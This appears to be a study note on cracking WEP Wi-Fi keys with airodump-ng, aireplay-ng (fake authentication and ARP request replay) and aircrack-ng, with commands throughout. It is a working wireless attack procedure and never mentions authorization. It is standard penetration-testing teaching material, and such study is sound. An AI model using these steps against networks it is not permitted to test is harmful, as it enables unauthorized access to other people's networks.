# WEP Cracking Basics

1. Requirements:
    1. Capture a large number of packets/IVs - using airodump-ng to capture the data
    2. Analyse the captured IVs and crack the key - using aircrack-ng to analyze this data and break the key

2. Basic in practice(for buzy network which can get enought data)
    ```
    # 1. Find the one is using WEP at ENC column
    airodump-ng [interface name] (--band abg)

    # 2. use airodump-ng on this network only
    airodump-ng --bssid [bssid] --channel [channel] --write basic_wep (-D) [interface name]
    # the number under the Data column is the number of useful packets that contain a different IV that we can use in order to crack the key.
    # Collect the data in the folder called basic_wep
    # we assume for now, the number is increasing fast, if it's not, it will be solved underneath

    # 3. Go to another terminal: ls
    aircrack-ng basic_wep.cap

    # 4. We will see the Key Found and we need to remove the ':' between numbers, which is the key of that network. We can join that network normally using the key
    ```

3. Associate with the network
    1. Problem: APs only communicate with connected clients
    2. Solution: Associate with the AP before launching the attack; In default, the access points ignore any requests they get unless the device has connected to this network or associated with it; We're doing is literally just telling the target network look that I want to communicate with you.
    ```
    # 1. use airodump-ng on the target network
    airodump-ng --bssid [bssid] --channel [channel] --write arpreplay (-D) [interface name]
    # collect the data into a folder called arpreplay
    
    # 2. Split another terminal 
    aireplay-ng --fakeauth 0 -a [bssid] -h [interface bssid] [interface name]
    # 1) number 0 means the time to wait between association attempts, putting 0 because I only want to do this once
    # 2) bssid is the MAC Address of the target
    # 3) -h is to specify the MAC address of my interface
    # 4) to get the interface id, we need to aplit another terminal window and the first 12 digits of the unspec field is the bssid(MAC Address of the interface) replace the minus with colons
    # 5) After running the command, we can see from the airodump-ng terminal, the AUTH shows OPN and the STATION contains the MAC Address I'm using
    # 6) Still don't connecting to the network, we just associated with it
    ```

4. Force generate new IVs
    1. ARP request replay: By repeating this process, we will be forcing the router to continuously generate new packets with new IVs
        1. Wait for an ARP packet
        2. Capture it, and replay it(retransmit it)
        3. This causes the AP to produce another packet with a new IV
        4. Keep doing this till we have enough IVs to crack the key
        5. Then we just need to use aircrack-ng same as before
    2. In practice
    ```
    # 1. Associate with the target network with the process in 3

    airodump-ng --bssid [bssid] --channel [channel] --write arpreplay (-D) [interface name]
    # Split the terminal
    aireplay-ng --fakeauth 0 -a [bssid] -h [interface bssid] [interface name]

    # 2. Conduct an ARP Attack similar as above(Similar to the fakeauth attack)(Split the terminal)

    aireplay-ng --arpreplay -b [bssid] -h [interface bssid] [interface name]
    # just wait until an arp packet exists

    # 3. Crack it
    
    aircrack-ng arpreplay.cap
    # can check the name of the foler by using ls command
    ```
    
